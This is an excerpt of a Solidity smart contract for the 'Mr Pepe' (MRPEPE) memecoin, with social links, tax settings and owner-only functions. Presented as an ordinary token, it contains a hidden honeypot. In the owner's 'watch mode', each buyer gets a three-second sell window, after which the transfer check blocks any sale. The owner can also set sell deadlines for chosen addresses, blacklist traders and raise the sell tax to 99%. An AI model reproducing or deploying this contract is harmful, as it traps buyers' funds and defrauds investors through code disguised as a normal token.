...
//👀 Twitter: https://twitter.com/MrPepe_ETH
//🔥  Telegram: https://t.me/mrpepeeth
...
contract MRPEPE is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) public _mrpepeSellTime;

    uint256 private _mrpepeSellTimeOffset = 3;
    bool public watchmrpepeMode = false;
    uint256 public _caughtMrPepes;
    ...
    uint256 public maxTxMrPepeAmount = 16_827_600 * (10**_decimals);
    uint256 public maxWalletMrPepe =  16_827_600 * (10**_decimals);

    string private constant _name = "Mr Pepe"; 
    string private constant _symbol = "MRPEPE";
    ...
    Tax public MrPepebuyTax = Tax(20,0);
    Tax public MrPepesellTax = Tax(30,0);
    
    address public marketingWallet = 0x9182804CDf5d377a5de7c5d9cD928c74FcE5469c;
...
//============== Owner Functions ===========//
    ...
    function owner_setMrPepeBuyTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
        uint tTax =  marketingTax + lpTax;
        require(tTax <= 30, "Can't set tax too high");
        MrPepebuyTax = Tax(marketingTax,lpTax);
        emit TaxesChanged();
    }

    function owner_setMrPepeSellTaxes(uint8 marketingTax, uint8 lpTax) external onlyOwner{
        uint tTax = marketingTax + lpTax;
        require(tTax <= 99, "Can't set tax too high");
        MrPepesellTax = Tax(marketingTax,lpTax);
        emit TaxesChanged();
    }
    
    function owner_setMrPepeTransferMaxes(uint maxTXMrPepe_EXACT, uint maxWalletMrPepe_EXACT) public onlyOwner{
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTXMrPepe_EXACT >= pointFiveSupply && maxWalletMrPepe_EXACT >= pointFiveSupply, "Invalid Settings");
        maxTxMrPepeAmount = maxTXMrPepe_EXACT * (10**_decimals);
        maxWalletMrPepe = maxWalletMrPepe_EXACT * (10**_decimals);
    }
    ...
    function owner_setWatchMrPepeMode(bool status_) external onlyOwner{
        watchmrpepeMode = status_;
    }

    function owner_setMrPepeSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _mrpepeSellTime[holder] = block.timestamp + dTime;
    }

// ========================================//. 
    
    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        Tax memory tmpTaxes = MrPepebuyTax;
        if (isSell){
            tmpTaxes = MrPepesellTax;
        }
    ...
    function _transfer(address from,address to,uint256 amount) private {
        ...
        require(amount <= maxTxMrPepeAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxMrPepeAmount.");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted, can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWalletMrPepe, "Transfer amount exceeds the maxWalletMrPepe.");
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            if (from == pair){
                if(watchmrpepeMode){
                    _caughtMrPepes++;
                    _mrpepeSellTime[to] = block.timestamp + _mrpepeSellTimeOffset;
                }
            }else{
                if (_mrpepeSellTime[from] != 0)
                    require(block.timestamp < _mrpepeSellTime[from]); 
            }
        }
